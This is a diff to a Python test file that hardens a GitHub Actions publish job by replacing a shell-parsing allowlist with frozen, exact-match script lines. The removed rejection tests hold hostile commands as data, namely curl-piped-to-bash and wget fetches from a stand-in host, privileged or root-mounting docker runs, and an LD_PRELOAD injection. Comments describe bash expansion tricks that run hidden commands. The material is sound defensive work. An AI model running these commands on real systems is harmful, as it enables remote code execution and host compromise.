@@ -2,15 +2,16 @@
 
 The workflow is parsed with PyYAML and its scripts are executed locally: the version
 check runs against a fake OCI registry, the re-read step runs with bash the way
-GitHub Actions does, and every publish-job shell command is checked against an
-allowlist.
+GitHub Actions does, and every publish-job script must match a hand-frozen,
+default-deny allowlist line for line (see PUBLISH_RUN_LINES).
 """
 
 import ast
+import copy
+import hashlib
 import json
 import os
 import re
-import shlex
 import subprocess
 import sys
 import threading
@@ -37,10 +38,6 @@ ALLOWED_PUBLISH_ACTIONS = {
     "docker/build-push-action@10e90e3645eae34f1e60eeb005ba3a3d33f178e8",
 }
 CANDIDATE_IMAGE = '"${IMAGE_NAME}@${{ steps.image.outputs.digest }}"'
-# The candidate image as one shell word, after shlex has removed the quotes.
-CANDIDATE_WORD = "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"
-VERSION_TAG_WORD = "${IMAGE_NAME}:${{ steps.version.outputs.value }}"
-LATEST_TAG_WORD = "${IMAGE_NAME}:latest"
 
 
 @dataclass
@@ -548,611 +545,255 @@ def test_publish_checks_version_before_login_and_build() -> None:
     assert names.index("Verify the candidate digest") < names.index("Promote verified digest")
 
 
-ALLOWED_COMMANDS = {
-    "docker",
-    "curl",
-    "python3",
-    "openssl",
-    "seq",
-    "sleep",
-    "echo",
-    "printf",
-    "grep",
-    "tr",
-    "test",
-    "[",
-    "[[",
-    "exit",
-    "break",
-    "true",
-}
-SHELL_KEYWORDS = {"if", "then", "else", "elif", "do", "while", "until", "!", "{"}
-SHELL_TERMINATORS = {"fi", "done", "}", "]]"}
-DOCKER_SUBCOMMANDS = {"pull", "run", "logs", "manifest", "buildx", "rm"}
-# Only the forms today's publish job needs. Anything else, such as
-# `docker buildx build --push` or `docker manifest push`, is rejected.
-# Exact argv (after `docker <subcommand>`) for the read-only and cleanup forms.
-DOCKER_EXACT_ARGS = {
-    "pull": [[CANDIDATE_WORD]],
-    "logs": [["ghidra-mcp-ci"]],
-    "rm": [["-f", "ghidra-mcp-ci"]],
-    "manifest": [["inspect", VERSION_TAG_WORD]],
-}
-IMAGETOOLS_INSPECT_ARGS = [VERSION_TAG_WORD, "--format", "{{json .Manifest.Digest}}"]
-# `imagetools create` may only promote the verified candidate to these tags.
-IMAGETOOLS_CREATE_TAGS = {VERSION_TAG_WORD, LATEST_TAG_WORD}
-DOCKER_NESTED_SUBCOMMANDS = {
-    "buildx": {("imagetools", "create"), ("imagetools", "inspect")},
-    "manifest": {("inspect",)},
-}
-# `docker run` may only start the candidate digest with exactly these options;
-# --privileged, -v/--mount, --entrypoint, --device, --pid, ... are all rejected.
-DOCKER_RUN_FLAGS = {"-d"}
-DOCKER_RUN_OPTIONS = {
-    "--name": re.compile(r"^ghidra-mcp-ci$"),
-    "--network": re.compile(r"^host$"),
-    "-e": re.compile(
-        r"^(GHIDRA_MCP_PUBLIC_URL=http://127\.0\.0\.1:[0-9]+|GHIDRA_MCP_AUTH_TOKEN=\$TOKEN)$"
+# ---------------------------------------------------------------------------
+# Publish job: default-deny, exact-match allowlist (SAF-50).
+#
+# Every bash `run:` script in the publish job must consist of exactly the logical
+# lines frozen below, in the same order, for the same step. Nothing is parsed as
+# shell: a line either equals a frozen line byte for byte or the test fails. The
+# text compared is the string yaml.safe_load returns, i.e. what Actions hands to
+# bash; `${{ }}` expressions are compared literally.
+#
+# These tables are hand-frozen on purpose. They are never regenerated from the
+# workflow at test time (that would make the test approve itself). Any change to
+# a publish script, a step's shell fields, or the version check script must
+# update the matching table in the same pull request, and the reviewer must
+# confirm the new text.
+# ---------------------------------------------------------------------------
+
+PUBLISH_RUN_LINES: dict[str, tuple[str, ...]] = {
+    "Re-read version and test outputs": (
+        "VERSION=\"$(tr -d '\\r\\n' < VERSION)\"",
+        '[[ "$VERSION" =~ ^[0-9]{8}\\.[1-9][0-9]*$ ]]',
+        'if [[ "$GITHUB_REF_NAME" != "v$VERSION" || "$VERSION" != "$TESTED_VERSION" ]]; then',
+        'echo "VERSION $VERSION does not match tag $GITHUB_REF_NAME or tested version $TESTED_VERSION" >&2',
+        "exit 1",
+        "fi",
+        '[[ "$TESTED_SCHEMA" =~ ^[0-9a-f]{16}$ ]]',
+        'echo "value=$VERSION" >> "$GITHUB_OUTPUT"',
+        'echo "schema=$TESTED_SCHEMA" >> "$GITHUB_OUTPUT"',
     ),
+    "Refuse to overwrite a released version": (
+        'if INSPECT_ERROR="$(docker manifest inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" 2>&1)"; then',
+        'echo "Version tag already exists: ${IMAGE_NAME}:${{ steps.version.outputs.value }}" >&2',
+        "exit 1",
+        "fi",
+        "if ! grep -Eqi 'manifest unknown|not found' <<<\"$INSPECT_ERROR\"; then",
+        'echo "Could not prove that the version tag is unused:" >&2',
+        "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
+        "exit 1",
+        "fi",
+    ),
+    "Verify the candidate digest": (
+        'docker pull "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+        'TOKEN="$(openssl rand -hex 32)"',
+        'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+        'HEALTH=""',
+        "for _ in $(seq 1 30); do",
+        'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
+        'if [ -n "$HEALTH" ]; then',
+        'python3 -c \'import json,sys; data=json.loads(sys.argv[4]); assert data == {"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], "schema_version": sys.argv[3]}\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
+        "break",
+        "fi",
+        "sleep 2",
+        "done",
+        'if [ -z "$HEALTH" ]; then',
+        "docker logs ghidra-mcp-ci",
+        "exit 1",
+        "fi",
+    ),
+    "Promote verified digest": (
+        'docker buildx imagetools create --tag "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --tag "${IMAGE_NAME}:latest" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
+        'VERSION_DIGEST="$(docker buildx imagetools inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --format \'{{json .Manifest.Digest}}\' | tr -d \'"\')"',
+        'test "$VERSION_DIGEST" = "${{ steps.image.outputs.digest }}"',
+    ),
+    "Remove verification container": ("docker rm -f ghidra-mcp-ci 2>/dev/null || true",),
 }
-# Plain fetches only: no -L/--location, -o/-O, -H, -x, --resolve, --unix-socket.
-CURL_OPTIONS = {"-f", "-s", "-S", "-fsS", "--fail", "--silent", "--show-error"}
-LOCAL_URL = re.compile(r"^http://127\.0\.0\.1:[0-9]+(/[A-Za-z0-9._~/-]*)?$")
-# Shell variables the publish job may set, only as plain `NAME=value` statements.
-# A prefix assignment (`LD_PRELOAD=x docker ...`) or any other name (PATH,
-# BASH_ENV, IFS, ...) is rejected. `for` may only bind `_`.
-ALLOWED_ASSIGNMENTS = {"VERSION", "TOKEN", "HEALTH", "VERSION_DIGEST", "INSPECT_ERROR"}
-ASSIGNMENT = re.compile(r"^([A-Za-z_][A-Za-z0-9_]*)\+?=")
-# The only redirections the publish job uses, as (fd, operator, target). Writes
-# to any other file, including $GITHUB_ENV and $GITHUB_PATH, are rejected.
-ALLOWED_REDIRECTIONS = {
-    ("", "<", "VERSION"),
-    ("", ">>", "$GITHUB_OUTPUT"),
-    ("", ">&", "2"),
-    ("2", ">&", "1"),
-    ("2", ">", "/dev/null"),
-    ("", "<<<", "$INSPECT_ERROR"),
-}
-SEPARATORS = {";", "&&", "||", "|", "|&", "&", "(", ")"}
-REDIRECTIONS = {">", ">>", "<", "<<", "<<<", ">&", "<&", "&>", ">|"}
-# shlex (punctuation_chars) returns every run of these characters as one token.
-# Such a token must be a separator or a redirection on ALLOWED_REDIRECTIONS;
-# anything else (&>>, <>, >>&, <(, >(, ((, ;;, ...) is rejected outright.
-SHELL_PUNCTUATION = set("();<>|&")
-# The only tokens allowed between [[ and ]] that are operators; test operators
-# such as -eq/-lt (arithmetic: `[[ 1 -eq PATH=1 ]]` assigns PATH) and -v
-# (evaluates array subscripts, which can run commands) are rejected.
-TEST_PUNCTUATION = {"||", "&&", "(", ")"}
-# `[` / `test` options the workflow uses; -v would evaluate array subscripts.
-TEST_OPERATORS = {"-n", "-z"}
-# Parameter expansion: only ${NAME}, and ${{ ... }} (GitHub expressions, replaced
-# before bash runs). ${X:=v} assigns, ${H@P} runs $(...) found in H's value, and
-# offsets/subscripts (${X:$A}, ${a[$A]}) and $[...] evaluate arithmetic, which
-# runs a[$(cmd)] found in a value such as $HEALTH (the candidate's output).
-PARAMETER_EXPANSION = re.compile(r"\$(\{(?!\{)(?![A-Za-z_][A-Za-z0-9_]*\})|\[)")
-# <(...) and >(...) run their contents as a command that is never checked.
-PROCESS_SUBSTITUTION = re.compile(r"[<>]\(")
-# Exact argv of the publish job's printf and python3 lines. printf -v NAME
-# would assign any variable; python3 -c could run any code after the prefix.
-PRINTF_ARGS = ["%s\\n", "$INSPECT_ERROR"]
-HEALTH_CHECK = (
-    "import json,sys; data=json.loads(sys.argv[4]); assert data == "
-    '{"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], '
-    '"schema_version": sys.argv[3]}'
+ALL_PUBLISH_RUN_LINES = frozenset(line for lines in PUBLISH_RUN_LINES.values() for line in lines)
+
+# sha256 of the version check script exactly as yaml.safe_load returns it (UTF-8).
+# Any change to the script must update this hash in the same pull request; the
+# behaviour tests above still cover what the script does.
+VERSION_CHECK_SHA256 = "fff2ef840624e268139f3506c7ebbec2afdc130d6e64d5fab0b55e5a00d66715"
+
+# The full step order of the publish job.
+PUBLISH_STEP_NAMES = (
+    "Check out repository",
+    "Re-read version and test outputs",
+    VERSION_CHECK,
+    "Set up Docker Buildx",
+    "Log in to GHCR",
+    "Refuse to overwrite a released version",
+    "Build and publish commit candidate",
+    "Verify the candidate digest",
+    "Promote verified digest",
+    "Remove verification container",
 )
-PYTHON_ARGS = [
-    "-c",
-    HEALTH_CHECK,
-    "${{ steps.version.outputs.value }}",
-    "${{ github.sha }}",
-    "${{ steps.version.outputs.schema }}",
-    "$HEALTH",
-]
+
+# Exact values of the shell-related fields of every `run:` step. A field missing
+# from a step's entry must be absent from the step. A step may have no keys other
+# than `name`, `run` and the fields listed for it, so `working-directory`,
+# `continue-on-error`, `with`, a new `env` (for example BASH_ENV), ... all fail.
+PUBLISH_RUN_STEP_FIELDS: dict[str, dict[str, object]] = {
+    "Re-read version and test outputs": {
+        "id": "version",
+        "shell": "bash",
+        "env": {
+            "TESTED_VERSION": "${{ needs.test.outputs.version }}",
+            "TESTED_SCHEMA": "${{ needs.test.outputs.schema }}",
+        },
+    },
+    VERSION_CHECK: {
+        "timeout-minutes": 5,
+        "shell": "python3 {0}",
+        "env": {"VERSION": "${{ steps.version.outputs.value }}", "REGISTRY_URL": "https://ghcr.io"},
+    },
+    "Refuse to overwrite a released version": {"shell": "bash"},
+    "Verify the candidate digest": {"shell": "bash"},
+    "Promote verified digest": {"shell": "bash"},
+    "Remove verification container": {"if": "always()"},
+}
+FROZEN_STEP_FIELDS = ("shell", "env", "if", "id", "timeout-minutes")
+
+# Environment visible to every publish step. A workflow- or job-level BASH_ENV,
+# ENV, PATH, ... would change what the frozen scripts do without touching them.
+WORKFLOW_ENV = {"IMAGE_NAME": "ghcr.io/${{ github.repository }}"}
+PUBLISH_JOB_KEYS = {"name", "needs", "runs-on", "timeout-minutes", "permissions", "steps"}
+
+# Rejected before any comparison, for a clearer message: `#` (comments, and the
+# mid-word `#` that hid commands from the old shlex-based checker), and every
+# character outside printable ASCII apart from the newline (tab, CR, other
+# control characters, non-ASCII). None of them occur in the frozen lines.
+FORBIDDEN_CHARACTER = re.compile(r"[^\x20-\x7e\n]|#")
+# A continuation must have a blank before the backslash: bash deletes `\`+newline,
+# so `a\<newline>b` is the single word `ab`, while joining would read `a b`.
+LINE_CONTINUATION = re.compile(r"[ \t]+\\\n[ \t]*")
 
 
-def _logical_lines(script: str) -> list[str]:
-    joined = re.sub(r"\\\n", " ", script)
+def _logical_lines(script: str) -> tuple[str, ...]:
+    """The only normalisation: join `\\` continuations, strip lines, drop empty ones."""
+    joined = LINE_CONTINUATION.sub(" ", script)
+    return tuple(line.strip() for line in joined.split("\n") if line.strip())
+
+
+def _same(actual: object, expected: object) -> bool:
+    # json.dumps keeps types apart (True vs 1, 5 vs "5") and compares nested
+    # mappings by content.
+    return json.dumps(actual, sort_keys=True) == json.dumps(expected, sort_keys=True)
+
+
+def _forbidden_characters(script: str) -> list[str]:
+    return sorted({repr(match) for match in FORBIDDEN_CHARACTER.findall(script)})
+
+
+def _line_problems(script: str) -> list[str]:
+    """Problems with a script whose every line must be some frozen publish line."""
+    bad = _forbidden_characters(script)
+    if bad:
+        return [f"forbidden character(s) {', '.join(bad)}"]
     return [
-        line.strip()
-        for line in joined.splitlines()
-        if line.strip() and not line.strip().startswith("#")
+        f"not allowlisted: {line}"
+        for line in _logical_lines(script)
+        if line not in ALL_PUBLISH_RUN_LINES
     ]
 
 
-def _split_substitutions(line: str) -> tuple[str, list[str]]:
-    """Replace each $(...) with a placeholder and return the inner scripts."""
-    inner: list[str] = []
-    out = []
-    index = 0
-    while index < len(line):
-        if line.startswith("$(", index) and not line.startswith("$((", index):
-            depth, end = 1, index + 2
-            while depth:
-                assert end < len(line), f"unbalanced $( in {line!r}"
-                depth += {"(": 1, ")": -1}.get(line[end], 0)
-                end += 1
-            inner.append(line[index + 2 : end - 1])
-            out.append("SUBSTITUTION")
-            index = end
-        else:
-            out.append(line[index])
-            index += 1
-    return "".join(out), inner
-
-
-def _simple_commands(line: str, problems: list[str]) -> list[list[str]]:
-    """Split a line into simple commands; append redirection/assignment problems."""
-    outer, inner = _split_substitutions(line)
-    commands = [command for script in inner for command in _simple_commands(script, problems)]
-    lexer = shlex.shlex(outer, posix=True, punctuation_chars=True)
-    lexer.whitespace_split = True
-    current: list[str] = []
-    tokens = list(lexer)
-    index = 0
-    in_test = False
-    while index < len(tokens):
-        token = tokens[index]
-        operator = set(token) <= SHELL_PUNCTUATION
-        if not operator and ("<" in token or ">" in token):
-            problems.append(f"'<' or '>' inside the word {token!r} is not allowed: {line}")
-        if token == "[[" and all(word in SHELL_KEYWORDS for word in current):
-            # Only a [[ in command position opens a test; `echo [[ ; curl ...`
-            # is two commands.
-            in_test = True
-        if in_test:
-            if operator and token not in TEST_PUNCTUATION:
-                problems.append(f"operator {token!r} inside [[ ]] is not allowed: {line}")
-            if token.startswith("-"):
-                problems.append(f"test operator {token} inside [[ ]] is not allowed: {line}")
-            current.append(token)
-            in_test = token != "]]"
-        elif operator and token not in SEPARATORS and token not in REDIRECTIONS:
-            problems.append(f"shell operator {token!r} is not allowed: {line}")
-            current.append(token)
-        elif token in SEPARATORS:
-            commands.append(current)
-            current = []
-        elif token in REDIRECTIONS:
-            # shlex splits `2>&1` into "2", ">&", "1": a bare fd number before the
-            # operator belongs to the redirection, not to the command.
-            fd = current.pop() if current and current[-1].isdigit() else ""
-            target = tokens[index + 1] if index + 1 < len(tokens) else ""
-            if (fd, token, target) not in ALLOWED_REDIRECTIONS:
-                problems.append(f"redirection {fd}{token} {target} is not allowed: {line}")
-            index += 1  # skip the redirection target
-        else:
-            current.append(token)
-        index += 1
-    if in_test:
-        problems.append(f"unterminated [[: {line}")
-    commands.append(current)
-    simple = []
-    for words in commands:
-        while words and words[0] in SHELL_KEYWORDS:
-            words = words[1:]
-        assignments = []
-        while words and ASSIGNMENT.match(words[0]):
-            assignments.append(ASSIGNMENT.match(words[0]).group(1))
-            words = words[1:]
-        for name in assignments:
-            if name not in ALLOWED_ASSIGNMENTS:
-                problems.append(f"assignment to {name} is not allowed: {line}")
-        if assignments and words and words[0] not in SHELL_TERMINATORS:
-            problems.append(f"environment prefix before {words[0]!r} is not allowed: {line}")
-        if words[:1] == ["for"] and words[1:3] != ["_", "in"]:
-            problems.append(f"for loop variable other than _: {line}")
-        if not words or words[0] in SHELL_TERMINATORS or words[0] == "for":
-            continue
-        simple.append(words)
-    return simple
-
-
-def _docker_run_problems(args: list[str], line: str) -> list[str]:
-    index = 0
-    while index < len(args) and args[index].startswith("-"):
-        option = args[index]
-        if option in DOCKER_RUN_FLAGS:
-            index += 1
-        elif option in DOCKER_RUN_OPTIONS and index + 1 < len(args):
-            if not DOCKER_RUN_OPTIONS[option].match(args[index + 1]):
-                return [f"docker run {option} {args[index + 1]} is not allowed: {line}"]
-            index += 2
-        else:
-            return [f"docker run option {option} is not allowed: {line}"]
-    if args[index:] != [CANDIDATE_WORD]:
-        return [f"docker run of anything but the candidate: {line}"]
-    return []
-
-
-def _imagetools_create_problems(args: list[str], line: str) -> list[str]:
-    tags, sources = [], []
-    index = 0
-    while index < len(args):
-        if args[index] == "--tag" and index + 1 < len(args):
-            tags.append(args[index + 1])
-            index += 2
-        elif args[index].startswith("-"):
-            return [f"imagetools create option {args[index]} is not allowed: {line}"]
-        else:
-            sources.append(args[index])
-            index += 1
-    if not tags or not set(tags) <= IMAGETOOLS_CREATE_TAGS:
-        return [f"imagetools create tags other than version/latest: {line}"]
-    if sources != [CANDIDATE_WORD]:
-        return [f"imagetools create from anything but the candidate: {line}"]
-    return []
-
-
-def _docker_problems(words: list[str], line: str) -> list[str]:
-    subcommand = words[1] if len(words) > 1 else ""
-    if subcommand not in DOCKER_SUBCOMMANDS:
-        return [f"docker {subcommand} is not allowed: {line}"]
-    nested = DOCKER_NESTED_SUBCOMMANDS.get(subcommand)
-    if nested is not None and not any(tuple(words[2 : 2 + len(form)]) == form for form in nested):
-        return [f"docker {subcommand} {' '.join(words[2:4])} is not allowed: {line}"]
-    if subcommand in DOCKER_EXACT_ARGS and words[2:] not in DOCKER_EXACT_ARGS[subcommand]:
-        return [f"docker {subcommand} with other arguments than the workflow's: {line}"]
-    if words[2:4] == ["imagetools", "inspect"] and words[4:] != IMAGETOOLS_INSPECT_ARGS:
-        return [f"imagetools inspect of anything but the version tag: {line}"]
-    if words[2:4] == ["imagetools", "create"]:
-        return _imagetools_create_problems(words[4:], line)
-    if subcommand == "run":
-        return _docker_run_problems(words[2:], line)
-    return []
-
-
-def _curl_problems(words: list[str], line: str) -> list[str]:
-    options = [word for word in words[1:] if word.startswith("-")]
-    urls = [word for word in words[1:] if not word.startswith("-")]
-    if any(option not in CURL_OPTIONS for option in options):
-        return [f"curl option other than {sorted(CURL_OPTIONS)}: {line}"]
-    if not urls or not all(LOCAL_URL.match(url) for url in urls):
-        return [f"curl outside localhost: {line}"]
-    return []
-
-
-def _disallowed_commands(script: str) -> list[str]:
+def _step_field_problems(name: str, step: dict[str, Any]) -> list[str]:
+    frozen = PUBLISH_RUN_STEP_FIELDS[name]
     problems = []
-    for line in _logical_lines(script):
-        if "`" in line:
-            # Backtick substitutions are not split out like $(...), so a command
-            # nested in them would hide behind an allowed one such as echo.
-            problems.append(f"backtick command substitution: {line}")
-            continue
-        if PROCESS_SUBSTITUTION.search(line):
-            problems.append(f"process substitution: {line}")
-            continue
-        if PARAMETER_EXPANSION.search(line):
-            problems.append(f"parameter expansion other than ${{NAME}}: {line}")
-        for words in _simple_commands(line, problems):
-            command = words[0]
-            if command not in ALLOWED_COMMANDS:
-                problems.append(f"{command!r} is not allowed: {line}")
-            elif command == "docker":
-                problems.extend(_docker_problems(words, line))
-            elif command == "curl":
-                problems.extend(_curl_problems(words, line))
-            elif command == "python3" and words[1:] != PYTHON_ARGS:
-                problems.append(f"python3 other than the workflow's health check: {line}")
-            elif command == "printf" and words[1:] != PRINTF_ARGS:
-                problems.append(f"printf other than the workflow's: {line}")
-            elif command in {"[", "test"} and any(
-                word.startswith("-") and word not in TEST_OPERATORS for word in words[1:]
-            ):
-                problems.append(f"test operator other than {sorted(TEST_OPERATORS)}: {line}")
-            elif command == "openssl" and words[1:2] != ["rand"]:
-                problems.append(f"openssl other than rand: {line}")
+    # Any key that is not frozen for this step must be absent, which covers a
+    # frozen field that the step does not have today (e.g. `env` on Remove).
+    extra = set(step) - {"name", "run"} - set(frozen)
+    if extra:
+        problems.append(f"{name}: keys {sorted(extra)} must be absent")
+    for key, value in frozen.items():
+        if not _same(step.get(key), value):
+            problems.append(f"{name}: {key} must be {value!r}, got {step.get(key)!r}")
     return problems
 
 
-@pytest.mark.parametrize(
-    "script",
-    [
-        "pip install requests",
-        "python3 -m pip install x",
-        "curl -fsSL https://example.invalid/install.sh | bash",
-        "curl -fsS http://127.0.0.1:8765/health | sh",
-        'sh -c "echo hi"',
-        "bash -c 'id'",
-        "wget https://example.invalid/x",
-        "docker run --rm alpine id",
-        'X="$(pipx run thing)"',
-        "for _ in $(seq 1 3); do npx tool; done",
-        "echo ok && uv run pytest",
-        "python3 script.py",
-        "docker exec ghidra-mcp-ci id",
-    ],
-)
-def test_publish_command_allowlist_rejects(script: str) -> None:
-    assert _disallowed_commands(script)
+def _bash_run_problems(name: str, run: str) -> list[str]:
+    bad = _forbidden_characters(run)
+    if bad:
+        return [f"{name}: forbidden character(s) {', '.join(bad)}"]
+    frozen = PUBLISH_RUN_LINES[name]
+    lines = _logical_lines(run)
+    problems = [
+        f"{name}: line {index} is not allowlisted for this step: {line}"
+        for index, line in enumerate(lines)
+        if line not in frozen
+    ]
+    if lines != frozen:
+        problems.append(
+            f"{name}: lines differ from the frozen sequence (order, duplicate or missing)"
+        )
+    return problems
 
 
-CANDIDATE_RUN = (
-    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" '
-)
+def _publish_problems(workflow: dict[str, Any]) -> list[str]:
+    """Every deviation of the publish job from the frozen tables; [] means it passes."""
+    problems = []
+    publish = workflow["jobs"]["publish"]
+    if "defaults" in workflow or "defaults" in publish:
+        problems.append("defaults: is not allowed at workflow or publish job level")
+    if not _same(workflow.get("env"), WORKFLOW_ENV):
+        problems.append(f"workflow env must be {WORKFLOW_ENV!r}, got {workflow.get('env')!r}")
+    if set(publish) != PUBLISH_JOB_KEYS:
+        problems.append(f"publish job keys {sorted(set(publish) ^ PUBLISH_JOB_KEYS)} added/removed")
+    steps = publish["steps"]
+    names = tuple(step.get("name") for step in steps)
+    if names != PUBLISH_STEP_NAMES:
+        problems.append(f"publish steps must be {PUBLISH_STEP_NAMES}, got {names}")
+    run_steps = [step for step in steps if "run" in step]
+    run_names = [step.get("name") for step in run_steps]
+    if sorted(map(str, run_names)) != sorted(PUBLISH_RUN_STEP_FIELDS):
+        problems.append(f"run steps must be {sorted(PUBLISH_RUN_STEP_FIELDS)}, got {run_names}")
+    for step in run_steps:
+        name = step.get("name")
+        if name not in PUBLISH_RUN_STEP_FIELDS:
+            problems.append(f"unknown run step: {name!r}")
+            continue
+        problems.extend(_step_field_problems(name, step))
+        run = step["run"]
+        if not isinstance(run, str):
+            problems.append(f"{name}: run is not a string")
+        elif name == VERSION_CHECK:
+            digest = hashlib.sha256(run.encode("utf-8")).hexdigest()
+            if digest != VERSION_CHECK_SHA256:
+                problems.append(f"{name}: script sha256 {digest} != VERSION_CHECK_SHA256")
+        else:
+            problems.extend(_bash_run_problems(name, run))
+    return problems
 
 
-# SAF-44: counterexamples from the PR #15 review (L1-L4). Each one passed the
-# allowlist before it was tightened; each must keep failing it.
-@pytest.mark.parametrize(
-    "script",
-    [
-        pytest.param("echo `wget http://example.invalid/x`", id="backtick-in-echo"),
-        pytest.param('HEALTH="`curl -fsS http://example.invalid/`"', id="backtick-in-assignment"),
-        pytest.param("docker buildx build --push -t ghcr.io/evil/x .", id="buildx-build-push"),
-        pytest.param("docker buildx imagetools push x", id="buildx-imagetools-other"),
-        pytest.param("docker manifest push ghcr.io/evil/x", id="manifest-push"),
-        pytest.param("docker pull alpine", id="pull-arbitrary-image"),
-        pytest.param("docker pull alpine " + CANDIDATE_IMAGE, id="pull-arbitrary-plus-candidate"),
-        pytest.param(
-            "docker pull --platform linux/arm64 " + CANDIDATE_IMAGE, id="pull-extra-option"
-        ),
-        pytest.param(CANDIDATE_RUN + "--privileged " + CANDIDATE_IMAGE, id="run-privileged"),
-        pytest.param(CANDIDATE_RUN + "-v /:/host " + CANDIDATE_IMAGE, id="run-mount-root"),
-        pytest.param(
-            CANDIDATE_RUN + "--mount type=bind,src=/,dst=/host " + CANDIDATE_IMAGE,
-            id="run-mount-option",
-        ),
-        pytest.param(
-            CANDIDATE_RUN + "--entrypoint /bin/sh " + CANDIDATE_IMAGE, id="run-entrypoint"
-        ),
-        pytest.param("docker run -dv /:/host " + CANDIDATE_IMAGE, id="run-bundled-short-flags"),
-        pytest.param(
-            "docker run -d --network container:x " + CANDIDATE_IMAGE, id="run-other-network"
-        ),
-        pytest.param("docker run -d -e LD_PRELOAD=/x.so " + CANDIDATE_IMAGE, id="run-foreign-env"),
-        pytest.param("docker run -d " + CANDIDATE_IMAGE + " id", id="run-trailing-argv"),
-        pytest.param("curl -L http://127.0.0.1:8765/health", id="curl-L"),
-        pytest.param("curl -fsSL http://127.0.0.1:8765/health", id="curl-fsSL"),
-        pytest.param("curl --location http://127.0.0.1:8765/health", id="curl-location"),
-        pytest.param("curl -fsS -o /tmp/x http://127.0.0.1:8765/health", id="curl-output-file"),
-        pytest.param("curl -fsS http://127.0.0.1:8765@example.invalid/", id="curl-userinfo-host"),
-    ],
-)
-def test_publish_command_allowlist_rejects_review_gaps(script: str) -> None:
-    assert _disallowed_commands(script)
+def test_publish_job_matches_the_frozen_allowlist() -> None:
+    assert _publish_problems(_workflow()) == []
 
 
-VERSION_TAG = '"${IMAGE_NAME}:${{ steps.version.outputs.value }}"'
-LATEST_TAG = '"${IMAGE_NAME}:latest"'
-PROMOTE = f"docker buildx imagetools create --tag {VERSION_TAG} --tag {LATEST_TAG} "
+def test_version_check_script_matches_the_pinned_hash() -> None:
+    script = _step("publish", VERSION_CHECK).run
+    assert script is not None
+    assert hashlib.sha256(script.encode("utf-8")).hexdigest() == VERSION_CHECK_SHA256
 
 
-# Verbatim logical lines (whitespace-normalized) of publish-container.yml's
-# publish job, minus bare exit/fi/break/done. Each must still be in the workflow
-# and must pass the allowlist; test_publish_job_runs_only_allowlisted_commands
-# additionally checks the whole real file.
-PRODUCTION_FORMS = [
-    "VERSION=\"$(tr -d '\\r\\n' < VERSION)\"",
-    '[[ "$VERSION" =~ ^[0-9]{8}\\.[1-9][0-9]*$ ]]',
-    'if [[ "$GITHUB_REF_NAME" != "v$VERSION" || "$VERSION" != "$TESTED_VERSION" ]]; then',
-    'echo "VERSION $VERSION does not match tag $GITHUB_REF_NAME or tested version $TESTED_VERSION" >&2',
-    '[[ "$TESTED_SCHEMA" =~ ^[0-9a-f]{16}$ ]]',
-    'echo "value=$VERSION" >> "$GITHUB_OUTPUT"',
-    'echo "schema=$TESTED_SCHEMA" >> "$GITHUB_OUTPUT"',
-    'if INSPECT_ERROR="$(docker manifest inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" 2>&1)"; then',
-    'echo "Version tag already exists: ${IMAGE_NAME}:${{ steps.version.outputs.value }}" >&2',
-    "if ! grep -Eqi 'manifest unknown|not found' <<<\"$INSPECT_ERROR\"; then",
-    'echo "Could not prove that the version tag is unused:" >&2',
-    "printf '%s\\n' \"$INSPECT_ERROR\" >&2",
-    'docker pull "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
-    'TOKEN="$(openssl rand -hex 32)"',
-    'docker run -d --name ghidra-mcp-ci --network host -e GHIDRA_MCP_PUBLIC_URL=http://127.0.0.1:8765 -e GHIDRA_MCP_AUTH_TOKEN="$TOKEN" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
-    'HEALTH=""',
-    "for _ in $(seq 1 30); do",
-    'HEALTH="$(curl -fsS http://127.0.0.1:8765/health || true)"',
-    'if [ -n "$HEALTH" ]; then',
-    'python3 -c \'import json,sys; data=json.loads(sys.argv[4]); assert data == {"status": "ok", "version": sys.argv[1], "git_commit": sys.argv[2], "schema_version": sys.argv[3]}\' "${{ steps.version.outputs.value }}" "${{ github.sha }}" "${{ steps.version.outputs.schema }}" "$HEALTH"',
-    "sleep 2",
-    'if [ -z "$HEALTH" ]; then',
-    "docker logs ghidra-mcp-ci",
-    'docker buildx imagetools create --tag "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --tag "${IMAGE_NAME}:latest" "${IMAGE_NAME}@${{ steps.image.outputs.digest }}"',
-    'VERSION_DIGEST="$(docker buildx imagetools inspect "${IMAGE_NAME}:${{ steps.version.outputs.value }}" --format \'{{json .Manifest.Digest}}\' | tr -d \'"\')"',
-    'test "$VERSION_DIGEST" = "${{ steps.image.outputs.digest }}"',
-    "docker rm -f ghidra-mcp-ci 2>/dev/null || true",
-]
+def test_publish_allowlist_tables_are_consistent() -> None:
+    # Frozen lines are already normalised and contain no forbidden character, and
+    # the run steps are exactly the frozen bash steps plus the version check.
+    for lines in PUBLISH_RUN_LINES.values():
+        for line in lines:
+            assert _logical_lines(line) == (line,)
+            assert not FORBIDDEN_CHARACTER.search(line), line
+    assert set(PUBLISH_RUN_STEP_FIELDS) == set(PUBLISH_RUN_LINES) | {VERSION_CHECK}
+    for fields in PUBLISH_RUN_STEP_FIELDS.values():
+        assert set(fields) <= set(FROZEN_STEP_FIELDS)
+    assert [name for name in PUBLISH_STEP_NAMES if name in PUBLISH_RUN_STEP_FIELDS] == list(
+        PUBLISH_RUN_STEP_FIELDS
+    )
+    assert sum(map(len, PUBLISH_RUN_LINES.values())) == 38
+    assert len(ALL_PUBLISH_RUN_LINES) == 31
 
 
-def _production_lines() -> set[str]:
-    return {
-        " ".join(line.split())
